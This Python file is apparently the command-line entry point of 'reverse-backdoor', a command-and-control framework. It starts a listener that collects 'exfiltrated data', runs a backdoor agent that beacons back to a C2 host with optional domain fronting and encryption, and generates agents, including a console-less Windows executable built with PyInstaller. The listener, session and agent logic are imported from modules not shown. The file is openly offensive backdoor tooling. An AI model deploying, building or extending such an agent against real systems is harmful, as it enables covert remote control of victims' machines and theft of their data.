#!/usr/bin/env python3
"""reverse-backdoor — Modular C2 Framework."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import click


@click.group(invoke_without_command=True)
@click.version_option(version='2.0.0', prog_name='reverse-backdoor')
@click.pass_context
def cli(ctx):
    """Modular, cross-platform C2 framework for red team operations.

    \b
    Quick start:
      reverse-backdoor server              Start C2 listener
      reverse-backdoor client              Start agent (backdoor)
      reverse-backdoor generate --os windows --host 10.0.0.1
    """
    if ctx.invoked_subcommand is None:
        click.echo(cli.get_help(ctx))


@cli.command()
@click.option('--host', default='0.0.0.0', envvar='REVERSE_BACKDOOR_BIND_HOST',
              help='Address to bind (default: 0.0.0.0)')
@click.option('--port', default=5555, envvar='REVERSE_BACKDOOR_BIND_PORT', type=int,
              help='Port to bind (default: 5555)')
@click.option('--loot', default='./loot', envvar='REVERSE_BACKDOOR_LOOT_DIR',
              help='Directory for exfiltrated data')
@click.option('--encryption/--no-encryption', default=False,
              help='Enable ECDH+AES-256-GCM encryption')
@click.option('--tls/--no-tls', default=False,
              help='Enable TLS transport encryption')
@click.option('--http/--no-http', default=False, envvar='REVERSE_BACKDOOR_HTTP',
              help='Use HTTP beacon instead of TCP')
def server(host, port, loot, encryption, tls, http):
    """Start the C2 listener and interactive manager."""
    if http:
        from server.server import _run_http
        os.environ['REVERSE_BACKDOOR_BIND_HOST'] = host
        os.environ['REVERSE_BACKDOOR_BIND_PORT'] = str(port)
        os.environ['REVERSE_BACKDOOR_LOOT_DIR'] = loot
        os.environ['REVERSE_BACKDOOR_TLS'] = str(tls).lower()
        _run_http({'bind_host': host, 'bind_port': port, 'loot_dir': loot, 'tls': tls, 'http_mode': True})
        return
    """Start the C2 listener and interactive manager."""
    click.secho('[+] Starting reverse-backdoor C2 server', fg='green', bold=True)
    click.secho(f'    Bind: {host}:{port}', fg='cyan')
    click.secho(f'    Loot: {os.path.abspath(loot)}', fg='cyan')
    enc_status = "ON" if encryption else "OFF"
    tls_status = "ON" if tls else "OFF"
    click.secho(f'    Encryption: {enc_status}', fg='cyan')
    click.secho(f'    TLS: {tls_status}', fg='cyan')
    click.echo()

    import signal
    from server.core.listener import start_listener
    from server.core.session import run_session, run_master_loop

    def session_callback(sock, ip, enc):
        run_session(sock, ip, loot, enc)

    shutdown_event = start_listener(host, port, session_callback, encryption, tls)
    signal.signal(signal.SIGINT, lambda s, f: shutdown_event.set())
    signal.signal(signal.SIGTERM, lambda s, f: shutdown_event.set())
    run_master_loop(loot, encryption)
    shutdown_event.set()


@cli.command()
@click.option('--host', default='127.0.0.1', envvar='REVERSE_BACKDOOR_SERVER_HOST',
              help='C2 server address (default: 127.0.0.1)')
@click.option('--port', default=5555, envvar='REVERSE_BACKDOOR_SERVER_PORT', type=int,
              help='C2 server port (default: 5555)')
@click.option('--reconnect', default=5, envvar='REVERSE_BACKDOOR_RECONNECT_INTERVAL', type=int,
              help='Reconnect interval in seconds (default: 5)')
@click.option('--encryption/--no-encryption', default=False,
              help='Enable ECDH+AES-256-GCM encryption')
@click.option('--tls/--no-tls', default=False,
              help='Enable TLS transport encryption')
@click.option('--http/--no-http', default=False, envvar='REVERSE_BACKDOOR_HTTP',
              help='Use HTTP beacon mode')
@click.option('--front-host', default=None,
              help='Domain fronting host header (e.g. cdn.cloudfront.net)')
def client(host, port, reconnect, encryption, tls, http, front_host):
    """Start the agent (backdoor) — connects to C2 server."""
    from client.core.connection import connect_and_run
    from client.core.dispatcher import handle_session
    from client.platform import get_platform

    platform = get_platform()

    if http:
        def shell_callback(proto, enc, tl, hm):
            handle_session(proto, platform, enc, tl, True, hm)
    else:
        def shell_callback(sock, enc, tl, hm):
            handle_session(sock, platform, enc, tl, True, hm)

    click.secho('[+] Agent connecting...', fg='yellow')
    click.secho(f'    Target: {host}:{port}', fg='cyan')
    click.secho(f'    HTTP: {\"ON\" if http else \"OFF\"}', fg='cyan')
    if front_host:
        click.secho(f'    Front host: {front_host}', fg='cyan')

    try:
        connect_and_run(host, port, shell_callback, reconnect,
                        encryption, tls, http, front_host)
    except KeyboardInterrupt:
        click.secho('\n[-] Agent stopped', fg='red')


@cli.command()
@click.option('--os', 'target_os', type=click.Choice(['windows', 'linux']),
              required=True, help='Target operating system')
@click.option('--host', required=True, help='C2 server IP/hostname')
@click.option('--port', default=5555, type=int, help='C2 server port')
@click.option('--output', '-o', default=None,
              help='Output filename (default: agent.exe / agent.elf)')
@click.option('--encryption/--no-encryption', default=False,
              help='Enable ECDH+AES-256-GCM encryption')
@click.option('--reconnect', default=5, type=int,
              help='Reconnect interval (default: 5s)')
def generate(target_os, host, port, output, encryption, reconnect):
    """Generate a standalone agent payload for the specified OS."""
    ext = '.exe' if target_os == 'windows' else '.elf' if target_os == 'linux' else ''
    output_path = output or f'agent_{target_os}{ext}'

    env_content = f"""REVERSE_BACKDOOR_SERVER_HOST={host}
REVERSE_BACKDOOR_SERVER_PORT={port}
REVERSE_BACKDOOR_RECONNECT_INTERVAL={reconnect}
REVERSE_BACKDOOR_ENCRYPTION={'true' if encryption else 'false'}
"""

    env_path = os.path.join(os.path.dirname(__file__), 'client', '.env')
    with open(env_path, 'w') as f:
        f.write(env_content)

    click.secho(f'[+] Generated .env config for {target_os}', fg='green')
    click.secho(f'    Host: {host}:{port}', fg='cyan')
    click.secho(f'    Reconnect: {reconnect}s', fg='cyan')

    click.echo()
    click.secho('[>] To compile on the target machine:', fg='yellow', bold=True)
    click.echo('  pip install pyinstaller')
    if target_os == 'windows':
        click.echo(f'  pyinstaller --onefile --noconsole client/client.py --name agent_{target_os}')
    else:
        click.echo(f'  pyinstaller --onefile client/client.py --name agent_{target_os}')
    click.echo()
    click.secho(f'  Output: dist/agent_{target_os}{ext}', fg='green')


if __name__ == '__main__':
    cli()
